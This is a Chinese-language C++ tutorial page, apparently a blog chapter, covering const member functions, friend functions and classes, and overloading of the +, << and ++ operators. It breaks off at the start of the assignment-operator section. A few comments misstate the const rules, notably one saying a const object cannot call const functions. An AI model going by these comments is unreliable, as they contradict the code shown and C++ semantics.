class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Person() &#123;</span><br><span class="line">m_A = <span class="number">0</span>;</span><br><span class="line">m_B = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this指针的本质是一个指针常量，指针的指向不可修改</span></span><br><span class="line"><span class="comment">//如果想让指针指向的值也不可以修改，需要声明常函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowPerson</span><span class="params">()</span> <span class="type">const</span> &#123;</span><br><span class="line"><span class="comment">//const Type* const pointer;</span></span><br><span class="line"><span class="comment">//this = NULL; //不能修改指针的指向 Person* const this;</span></span><br><span class="line"><span class="comment">//this-&gt;mA = 100; //但是this指针指向的对象的数据是可以修改的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span></span><br><span class="line">this-&gt;m_B = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyFunc</span><span class="params">()</span> <span class="type">const</span> &#123;</span><br><span class="line"><span class="comment">//mA = 10000;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">mutable <span class="type">int</span> m_B; <span class="comment">//可修改 可变的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰对象  常对象</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> Person person; <span class="comment">//常量对象</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; person.m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//person.mA = 100; //常对象不能修改成员变量的值,但是可以访问</span></span><br><span class="line">person.m_B = <span class="number">100</span>; <span class="comment">//但是常对象可以修改mutable修饰成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//常对象访问成员函数</span></span><br><span class="line">person.MyFunc(); <span class="comment">//常对象不能调用const的函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-友元">4.4 友元</h3><p>生活中你的家有客厅(Public)，有你的卧室(Private)</p><p>客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去</p><p>但是呢，你也可以允许你的好闺蜜好基友进去。</p><p>在程序里，有些私有属性 也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术</p><p>友元的目的就是让一个函数或者类 访问另一个类中私有成员</p><p>友元的关键字为  friend</p><p>友元的三种实现</p><ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul><h4 id="4-4-1-全局函数做友元">4.4.1 全局函数做友元</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容</span></span><br><span class="line">friend <span class="type">void</span> <span class="title function_">goodGay</span><span class="params">(Building * building)</span>;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Building()</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">this-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="built_in">string</span> m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"><span class="built_in">string</span> m_BedRoom; <span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodGay</span><span class="params">(Building * building)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Building b;</span><br><span class="line">goodGay(&amp;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-4-2-类做友元">4.4.2 类做友元</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">goodGay</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">goodGay();</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span></span><br><span class="line">friend <span class="class"><span class="keyword">class</span> <span class="title">goodGay</span>;</span></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">Building();</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="built_in">string</span> m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line">private:</span><br><span class="line"><span class="built_in">string</span> m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::Building()</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">this-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::goodGay()</span><br><span class="line">&#123;</span><br><span class="line">building = new Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodGay::visit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">goodGay gg;</span><br><span class="line">gg.visit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-4-3-成员函数做友元">4.4.3 成员函数做友元</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">goodGay</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">goodGay();</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">()</span>; <span class="comment">//只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">visit2</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span></span><br><span class="line">friend <span class="type">void</span> <span class="title function_">goodGay::visit</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">Building();</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="built_in">string</span> m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line">private:</span><br><span class="line"><span class="built_in">string</span> m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::Building()</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">this-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::goodGay()</span><br><span class="line">&#123;</span><br><span class="line">building = new Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodGay::visit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodGay::visit2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">goodGay  gg;</span><br><span class="line">gg.visit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-5-运算符重载">4.5 运算符重载</h3><p>运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p><h4 id="4-5-1-加号运算符重载">4.5.1 加号运算符重载</h4><p>作用：实现两个自定义数据类型相加的运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Person() &#123;&#125;;</span><br><span class="line">Person(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_A = a;</span><br><span class="line">this-&gt;m_B = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成员函数实现 + 号运算符重载</span></span><br><span class="line">Person operator+(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">Person temp;</span><br><span class="line">temp.m_A = this-&gt;m_A + p.m_A;</span><br><span class="line">temp.m_B = this-&gt;m_B + p.m_B;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数实现 + 号运算符重载</span></span><br><span class="line"><span class="comment">//Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;</span></span><br><span class="line"><span class="comment">//Person temp(0, 0);</span></span><br><span class="line"><span class="comment">//temp.m_A = p1.m_A + p2.m_A;</span></span><br><span class="line"><span class="comment">//temp.m_B = p1.m_B + p2.m_B;</span></span><br><span class="line"><span class="comment">//return temp;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运算符重载 可以发生函数重载</span></span><br><span class="line">Person operator+(<span class="type">const</span> Person&amp; p2, <span class="type">int</span> val)</span><br><span class="line">&#123;</span><br><span class="line">Person temp;</span><br><span class="line">temp.m_A = p2.m_A + val;</span><br><span class="line">temp.m_B = p2.m_B + val;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">10</span>, <span class="number">10</span>)</span>;</span><br><span class="line">Person <span class="title function_">p2</span><span class="params">(<span class="number">20</span>, <span class="number">20</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//成员函数方式</span></span><br><span class="line">Person p3 = p2 + p1;  <span class="comment">//相当于 p2.operaor+(p1)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p3.m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p3.m_B &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Person p4 = p3 + <span class="number">10</span>; <span class="comment">//相当于 operator+(p3,10)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p4.m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p4.m_B &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结 1：对于内置的数据类型的表达式的的运算符是不可能改变的</p></blockquote><blockquote><p>总结 2：不要滥用运算符重载</p></blockquote><h4 id="4-5-2-左移运算符重载">4.5.2 左移运算符重载</h4><p>作用：可以输出自定义数据类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p);</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Person(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_A = a;</span><br><span class="line">this-&gt;m_B = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果</span></span><br><span class="line"><span class="comment">//void operator&lt;&lt;(Person&amp; p)&#123;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数实现左移重载</span></span><br><span class="line"><span class="comment">//ostream对象只能有一个</span></span><br><span class="line">ostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;</span><br><span class="line">out &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; p.m_A &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; p.m_B;</span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p1 &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//链式编程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：重载左移运算符配合友元可以实现输出自定义数据类型</p></blockquote><h4 id="4-5-3-递增运算符重载">4.5.3 递增运算符重载</h4><p>作用： 通过重载递增运算符，实现自己的整型数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyInteger</span> &#123;</span></span><br><span class="line"></span><br><span class="line">friend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint);</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">MyInteger() &#123;</span><br><span class="line">m_Num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//前置++</span></span><br><span class="line">MyInteger&amp; operator++() &#123;</span><br><span class="line"><span class="comment">//先++</span></span><br><span class="line">m_Num++;</span><br><span class="line"><span class="comment">//再返回</span></span><br><span class="line"><span class="keyword">return</span> *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置++</span></span><br><span class="line">MyInteger operator++(<span class="type">int</span>) &#123;</span><br><span class="line"><span class="comment">//先返回</span></span><br><span class="line">MyInteger temp = *this; <span class="comment">//记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；</span></span><br><span class="line">m_Num++;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_Num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;</span><br><span class="line">out &lt;&lt; myint.m_Num;</span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//前置++ 先++ 再返回</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line">MyInteger myInt;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ++myInt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; myInt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置++ 先返回 再++</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">MyInteger myInt;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; myInt++ &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; myInt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"><span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结： 前置递增返回引用，后置递增返回值</p></blockquote><h4 id="4-5-4-赋值运算符重载">4.5.4 赋值运算符重载</h4><p>c++编译器至少给一个类添加 4 个函数</p><ol><li>默认构造函数(无参，函数体为空)</li><li>默认析构函数(无参，函数体为空)</li><li>默认拷贝构造函数，对属性进行值拷贝</li><li>赋值运算符 operator=, 对属性进行值拷贝</li></ol><p>如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 